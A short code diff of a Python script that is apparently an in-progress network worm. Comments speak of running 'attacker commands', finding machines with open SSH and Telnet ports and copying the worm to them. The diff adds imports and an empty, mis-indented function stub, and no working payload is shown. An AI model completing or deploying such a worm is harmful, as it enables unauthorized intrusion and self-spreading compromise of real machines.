@@ -25,8 +25,8 @@ while True: #infinite loop, instant start
             except:
                 continue"""
 
-#import telnetlib 
-#import socket
+import telnetlib 
+import socket
 import paramiko
 import csv
 from itertools import product
@@ -55,6 +55,11 @@ while True: #infinite loop, instant start
                 #   TODO: execute attacker commands here
                     #"attacker commands" output two files, open_ssh.log and open_telnet.log
                     #contains list of IPs with open ssh and telnet ports respectively
+
+                def find_vulnerable_machines():
+                open_ssh = []
+                open_telnet = []
+
                 # copy this worm program to remote machine
                 # execute worm on remote machine
                 
